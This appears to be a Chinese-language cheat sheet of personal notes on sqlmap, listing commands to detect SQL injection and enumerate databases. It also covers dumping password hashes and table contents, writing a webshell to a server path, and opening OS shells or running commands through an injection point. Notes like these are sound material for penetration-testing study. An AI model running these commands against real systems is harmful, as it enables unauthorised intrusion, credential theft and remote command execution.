# sqlmap 笔记

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

**官网**
- https://github.com/sqlmapproject/sqlmap

**文章**
- [Sqlmap使用教程【个人笔记精华整理】 | 漏洞人生](http://www.vuln.cn/1992)

---

## 常见操作
**检测注入**
```bash
sqlmap -u URL   # 判断注入
sqlmap -u URL -p id # 指定参数注入
sqlmap -u URL --cookie="xxxxx"  # 带 cookie 注入
sqlmap -u URL --batch   # 不要请求用户输入，使用默认行为
sqlmap -r aaa.txt   # post型注入

sqlmap -u URL --os "Windows"    # 指定操作系统
sqlmap -u URL --dbms mysql --level 3  # 指定数据库类型为 mysql，级别为 3（共 5 级，级别越高，检测越全面）
sqlmap -u URL --dbms mysql --risk 3   # 指定执行测试的风险(1-3, 默认 1) 1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试
sqlmap -u URL --dbms mysql --prefix "%df%27" --technique U -v 3   # 宽字节检测
sqlmap -u URL --proxy "socks5://127.0.0.1:1080" # 代理注入测试
sqlmap -u URL --referer "http://www.google.com" # 模拟来源
sqlmap -u URL --user-agent "Googlebot/2.1(+http://www.googlebot.com/bot.html)"  # 模拟谷歌蜘蛛
```

**获取信息**
```bash
sqlmap -u URL --current-db  # 获取当前数据库
sqlmap -u URL --dbs  # 枚举所有数据库
sqlmap -u URL -f    # 检查 DBMS 版本
sqlmap -u URL --is-dba  # 判断当前用户是否是 dba
sqlmap -u URL --users   # 列出数据库管理系统用户
sqlmap -u URL --privileges  # 枚举 DBMS 用户权限
sqlmap -u URL --passwords   # 获取当前数据库密码

sqlmap -u URL -D DATABASE --tables  # 获取数据库表
sqlmap -u URL -D DATABASE -T TABLES --columns   # 获取指定表的列名
sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump   # 获取指定表的列名
sqlmap -u URL -dbms mysql -level 3 -D test -T admin -C "username,password" -dump    # dump 出字段 username 与 password 中的数据
sqlmap -u URL --dump-all    # 列出所有数据库，所有表内容
```

**搜索字段**
```bash
sqlmap -r "c:\tools\request.txt" -dbms mysql -D dedecms --search -C admin,password   # 在 dedecms 数据库中搜索字段 admin 或者 password。
```

**读取与写入文件**

首先找需要网站的物理路径，其次需要有可写或可读权限。

- -file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
- -file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
- -file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
```bash
sqlmap -r aaa.txt --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"

# 注：mysql 不支持列目录，仅支持读取单个文件。sqlserver 可以列目录，不能读写文件，但需要一个 xp_dirtree 函数
```

**提权**
```bash
sqlmap -u URL --sql-shell   # 获取一个 sql-shell 会话
sqlmap -u URL --os-shell    # 获取一个 os-shell 会话
sqlmap -u URL --os-cmd=ipconfig # 在注入点直接执行命令
```
